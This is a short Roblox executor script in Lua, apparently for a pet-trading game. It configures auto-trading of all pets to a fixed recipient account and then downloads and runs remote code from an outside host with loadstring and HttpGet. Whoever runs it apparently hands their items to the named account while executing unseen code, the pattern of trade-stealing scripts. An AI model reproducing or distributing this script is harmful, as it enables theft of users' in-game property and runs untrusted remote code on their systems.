getgenv().hub_key = "0f1d2be3a69c9b88328c6efd074ac55c"
--auto accept and complete trades
getgenv().autoaccept = false

--auto trade will not work if autoaccept is true
getgenv().autotrade = true

--The person your sending the trade to.
getgenv().recipient = "oliwier_kozakk"

getgenv().trade_queue = { "pets" }
-- { "all" }
--{ "pets", "transport", "gifts", "pet_accessories", "strollers", "toys", "food" }

getgenv().pet_kind = {}
--Choose 1 pet type example { "snorgle", "cheetah" } or "{}" for all pets.

getgenv().pet_type = "ALL"
--Choose 1
--ALL, "mega", "neon", "regular", "eggs"

getgenv().selectedRarity = "ALL"
--Choose 1
--"ALL", "legendary", "ultra_rare", "rare", "uncommon", "common"

getgenv().selectedAge = "ALL"
--Choose 1
--"ALL", "1", "2", "3", "4", "5", "6"

loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_AUTO_TRADE.lua"))()
